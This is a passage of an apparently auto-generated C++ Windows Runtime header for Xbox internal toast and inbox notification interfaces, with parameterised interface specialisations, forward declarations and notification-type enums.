IAsyncOperationCompletedHandler<__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification*> : IAsyncOperationCompletedHandler_impl<__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.AsyncOperationCompletedHandler`1<Windows.Foundation.Collections.IVectorView`1<Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotification>>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IAsyncOperationCompletedHandler<__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification*> __FIAsyncOperationCompletedHandler_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t;
#define __FIAsyncOperationCompletedHandler_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::__FIAsyncOperationCompletedHandler_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t
/* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIAsyncOperationCompletedHandler_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::IAsyncOperationCompletedHandler<Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>*>
//#define __FIAsyncOperationCompletedHandler_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t Windows::Foundation::IAsyncOperationCompletedHandler<Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIAsyncOperationCompletedHandler_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIAsyncOperation_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#define DEF___FIAsyncOperation_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation {
template <>
struct __declspec(uuid("9ea3a683-9fd8-5189-8363-ab7089fd7154"))
IAsyncOperation<__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification*> : IAsyncOperation_impl<__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.IAsyncOperation`1<Windows.Foundation.Collections.IVectorView`1<Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotification>>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IAsyncOperation<__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification*> __FIAsyncOperation_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t;
#define __FIAsyncOperation_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::__FIAsyncOperation_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t
/* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIAsyncOperation_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::IAsyncOperation<Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>*>
//#define __FIAsyncOperation_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t Windows::Foundation::IAsyncOperation<Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIAsyncOperation_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIAsyncOperationCompletedHandler_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#define DEF___FIAsyncOperationCompletedHandler_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation {
template <>
struct __declspec(uuid("f1dfaf63-e62d-5f27-bf3a-c4db0564bba3"))
IAsyncOperationCompletedHandler<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> : IAsyncOperationCompletedHandler_impl<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.AsyncOperationCompletedHandler`1<Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotification>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IAsyncOperationCompletedHandler<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> __FIAsyncOperationCompletedHandler_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t;
#define __FIAsyncOperationCompletedHandler_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::__FIAsyncOperationCompletedHandler_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t
/* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIAsyncOperationCompletedHandler_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::IAsyncOperationCompletedHandler<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>
//#define __FIAsyncOperationCompletedHandler_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t Windows::Foundation::IAsyncOperationCompletedHandler<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIAsyncOperationCompletedHandler_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIAsyncOperation_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#define DEF___FIAsyncOperation_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation {
template <>
struct __declspec(uuid("e1f71e00-6e62-5c9e-8a2c-8a85bd530130"))
IAsyncOperation<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> : IAsyncOperation_impl<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.IAsyncOperation`1<Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotification>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IAsyncOperation<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> __FIAsyncOperation_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t;
#define __FIAsyncOperation_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::__FIAsyncOperation_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t
/* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIAsyncOperation_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::IAsyncOperation<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>
//#define __FIAsyncOperation_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t Windows::Foundation::IAsyncOperation<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIAsyncOperation_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#ifndef DEF___FIKeyValuePair_2_HSTRING_HSTRING_USE
#define DEF___FIKeyValuePair_2_HSTRING_HSTRING_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("60310303-49c5-52e6-abc6-a9b36eccc716"))
IKeyValuePair<HSTRING,HSTRING> : IKeyValuePair_impl<HSTRING,HSTRING> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IKeyValuePair`2<String, String>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IKeyValuePair<HSTRING,HSTRING> __FIKeyValuePair_2_HSTRING_HSTRING_t;
#define __FIKeyValuePair_2_HSTRING_HSTRING Windows::Foundation::Collections::__FIKeyValuePair_2_HSTRING_HSTRING_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIKeyValuePair_2_HSTRING_HSTRING Windows::Foundation::Collections::IKeyValuePair<HSTRING,HSTRING>
//#define __FIKeyValuePair_2_HSTRING_HSTRING_t Windows::Foundation::Collections::IKeyValuePair<HSTRING,HSTRING>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIKeyValuePair_2_HSTRING_HSTRING_USE */





#ifndef DEF___FIIterator_1___FIKeyValuePair_2_HSTRING_HSTRING_USE
#define DEF___FIIterator_1___FIKeyValuePair_2_HSTRING_HSTRING_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("05eb86f1-7140-5517-b88d-cbaebe57e6b1"))
IIterator<__FIKeyValuePair_2_HSTRING_HSTRING*> : IIterator_impl<__FIKeyValuePair_2_HSTRING_HSTRING*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterator`1<Windows.Foundation.Collections.IKeyValuePair`2<String, String>>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterator<__FIKeyValuePair_2_HSTRING_HSTRING*> __FIIterator_1___FIKeyValuePair_2_HSTRING_HSTRING_t;
#define __FIIterator_1___FIKeyValuePair_2_HSTRING_HSTRING Windows::Foundation::Collections::__FIIterator_1___FIKeyValuePair_2_HSTRING_HSTRING_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterator_1___FIKeyValuePair_2_HSTRING_HSTRING Windows::Foundation::Collections::IIterator<Windows::Foundation::Collections::IKeyValuePair<HSTRING,HSTRING>*>
//#define __FIIterator_1___FIKeyValuePair_2_HSTRING_HSTRING_t Windows::Foundation::Collections::IIterator<Windows::Foundation::Collections::IKeyValuePair<HSTRING,HSTRING>*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterator_1___FIKeyValuePair_2_HSTRING_HSTRING_USE */





#ifndef DEF___FIIterable_1___FIKeyValuePair_2_HSTRING_HSTRING_USE
#define DEF___FIIterable_1___FIKeyValuePair_2_HSTRING_HSTRING_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("e9bdaaf0-cbf6-5c72-be90-29cbf3a1319b"))
IIterable<__FIKeyValuePair_2_HSTRING_HSTRING*> : IIterable_impl<__FIKeyValuePair_2_HSTRING_HSTRING*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterable`1<Windows.Foundation.Collections.IKeyValuePair`2<String, String>>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterable<__FIKeyValuePair_2_HSTRING_HSTRING*> __FIIterable_1___FIKeyValuePair_2_HSTRING_HSTRING_t;
#define __FIIterable_1___FIKeyValuePair_2_HSTRING_HSTRING Windows::Foundation::Collections::__FIIterable_1___FIKeyValuePair_2_HSTRING_HSTRING_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterable_1___FIKeyValuePair_2_HSTRING_HSTRING Windows::Foundation::Collections::IIterable<Windows::Foundation::Collections::IKeyValuePair<HSTRING,HSTRING>*>
//#define __FIIterable_1___FIKeyValuePair_2_HSTRING_HSTRING_t Windows::Foundation::Collections::IIterable<Windows::Foundation::Collections::IKeyValuePair<HSTRING,HSTRING>*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterable_1___FIKeyValuePair_2_HSTRING_HSTRING_USE */




#ifndef DEF___FIMapView_2_HSTRING_HSTRING_USE
#define DEF___FIMapView_2_HSTRING_HSTRING_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("ac7f26f2-feb7-5b2a-8ac4-345bc62caede"))
IMapView<HSTRING,HSTRING> : IMapView_impl<HSTRING,HSTRING> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IMapView`2<String, String>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IMapView<HSTRING,HSTRING> __FIMapView_2_HSTRING_HSTRING_t;
#define __FIMapView_2_HSTRING_HSTRING Windows::Foundation::Collections::__FIMapView_2_HSTRING_HSTRING_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIMapView_2_HSTRING_HSTRING Windows::Foundation::Collections::IMapView<HSTRING,HSTRING>
//#define __FIMapView_2_HSTRING_HSTRING_t Windows::Foundation::Collections::IMapView<HSTRING,HSTRING>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIMapView_2_HSTRING_HSTRING_USE */





#ifndef ____x_Windows_CXbox_CInput_CIController_FWD_DEFINED__
#define ____x_Windows_CXbox_CInput_CIController_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace Input {
            interface IController;
        } /* Input */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CInput_CIController Windows::Xbox::Input::IController

#endif // ____x_Windows_CXbox_CInput_CIController_FWD_DEFINED__










namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    
                    typedef enum InboxActorType : int InboxActorType;
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */


namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    
                    typedef enum InboxCategory : int InboxCategory;
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */


namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    
                    typedef enum InboxImageType : int InboxImageType;
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */


namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    
                    typedef enum InboxType : int InboxType;
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */


namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    
                    typedef enum QuickRowType : int QuickRowType;
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */


namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    
                    typedef enum StandardNotificationType : int StandardNotificationType;
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */


namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    
                    typedef enum ToastDuration : int ToastDuration;
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */


namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    
                    typedef enum ToastNotificationType : int ToastNotificationType;
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

























namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class InboxAction;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */



namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class InboxActor;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */



namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class InboxGameType;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */




namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class InboxNotification;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */



namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class InboxNotificationOptions;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */



namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class PickerOption;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */



namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class Toast;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */



namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class ToastAction;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */



namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class ToastEditInput;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */



namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class ToastImage;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */




namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class ToastPickerInput;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */



namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class ToastPopupModel;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */



namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class ToastStoreGroup;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */



namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    class ToastStoreModel;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */














/*
 *
 * Struct Windows.Xbox.UI.Internal.ToastNotifications.InboxActorType
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */

#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [v1_enum, contract] */
                    enum InboxActorType : int
                    {
                        InboxActorType_User = 1,
                        InboxActorType_Club = 2,
                        InboxActorType_Title = 3,
                    };
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Struct Windows.Xbox.UI.Internal.ToastNotifications.InboxCategory
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */

#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [v1_enum, contract] */
                    enum InboxCategory : int
                    {
                        InboxCategory_Any = 0,
                        InboxCategory_Achievements = 1,
                        InboxCategory_Assist = 2,
                        InboxCategory_Ballots = 3,
                        InboxCategory_Clubs = 4,
                        InboxCategory_Comments = 5,
                        InboxCategory_Family = 6,
                        InboxCategory_Multiplayer = 7,
                        InboxCategory_People = 8,
                        InboxCategory_SubscriptionsExpiring = 9,
                        InboxCategory_Store = 10,
                        InboxCategory_Insider = 11,
                    };
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Struct Windows.Xbox.UI.Internal.ToastNotifications.InboxImageType
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */

#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [v1_enum, contract] */
                    enum InboxImageType : int
                    {
                        InboxImageType_User = 1,
                        InboxImageType_Club = 2,
                    };
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Struct Windows.Xbox.UI.Internal.ToastNotifications.InboxType
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */

#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [v1_enum, contract] */
                    enum InboxType : int
                    {
                        InboxType_Any = 0,
                        InboxType_AchievementUnlock = 1,
                        InboxType_GeneralCSAT = 2,
                        InboxType_MakeGoodAction = 3,
                        InboxType_SubscriptionPriceChange = 4,
                        InboxType_SubscriptionState = 5,
                        InboxType_PreOrder = 6,
                        InboxType_SubscriptionPiExpired = 7,
                        InboxType_BallotClose = 8,
                        InboxType_MemberAdded = 9,
                        InboxType_RequestToJoin = 10,
                        InboxType_ModerationRequested = 11,
                        InboxType_OwnershipTransferred = 12,
                        InboxType_PromotedToAdmin = 13,
                        InboxType_AdminRemoved = 14,
                        InboxType_InvitedToClub = 15,
                        InboxType_OwnerLike = 16,
                        InboxType_OwnerComment = 17,
                        InboxType_OwnerShare = 18,
                        InboxType_CoComment = 19,
                        InboxType_ContentApproved = 20,
                        InboxType_ContentRejected = 21,
                        InboxType_FriendApproved = 22,
                        InboxType_FriendRejected = 23,
                        InboxType_TitleMultiplayerApproved = 24,
                        InboxType_TitleMultiplayerRejected = 25,
                        InboxType_LfgApplications = 26,
                        InboxType_LfgWithdrawals = 27,
                        InboxType_LfgUpdates = 28,
                        InboxType_GameInvites = 29,
                        InboxType_GamePartyInvites = 30,
                        InboxType_GamePartyInvitesWithoutHandles = 31,
                        InboxType_MultiplayerActivityGameInvites = 32,
                        InboxType_PartyInvites = 33,
                        InboxType_Followers = 34,
                        InboxType_WishListSale = 35,
                        InboxType_Gold = 36,
                        InboxType_GamePass = 37,
                        InboxType_MultiplayerActivityAskToJoin = 38,
                        InboxType_ThermalGuide = 39,
                        InboxType_PlaytestAvailable = 40,
                        InboxType_PlaytestReadyForPreInstall = 41,
                        InboxType_PlaytestStarted = 42,
                        InboxType_PreviewRingInvite = 43,
                        InboxType_InsiderXPEarned = 44,
                        InboxType_NewQuest = 45,
                        InboxType_NewSurvey = 46,
                    };
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Struct Windows.Xbox.UI.Internal.ToastNotifications.QuickRowType
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */

#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [v1_enum, contract] */
                    enum QuickRowType : int
                    {
                        QuickRowType_Unused = 0,
                        QuickRowType_Verb = 1,
                        QuickRowType_Edit = 2,
                        QuickRowType_Picker = 3,
                        QuickRowType_Max = 4,
                    };
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Struct Windows.Xbox.UI.Internal.ToastNotifications.StandardNotificationType
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */

#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [v1_enum, contract] */
                    enum StandardNotificationType : int
                    {
                        StandardNotificationType_IdleTimeout = 0,
                        StandardNotificationType_CurrentUserBackgroundChanged = 1,
                    };
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Struct Windows.Xbox.UI.Internal.ToastNotifications.ToastDuration
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */

#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [v1_enum, contract] */
                    enum ToastDuration : int
                    {
                        ToastDuration_Short = 0,
                        ToastDuration_Long = 1,
                    };
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Struct Windows.Xbox.UI.Internal.ToastNotifications.ToastNotificationType
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */

#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [v1_enum, contract] */
                    enum ToastNotificationType : int
                    {
                        ToastNotificationType_Standard = 0,
                        ToastNotificationType_SignIn = 1,
                        ToastNotificationType_Achievement = 2,
                        ToastNotificationType_RareAchievement = 3,
                        ToastNotificationType_SkypeIncomingCall = 4,
                        ToastNotificationType_Invite = 5,
                        ToastNotificationType_CloudGaming = 6,
                    };
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Delegate Windows.Xbox.UI.Internal.ToastNotifications.ActiveToastChangedHandler
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler_INTERFACE_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("7EED3F65-2E49-43F3-AE28-48F1F3152313"), contract] */
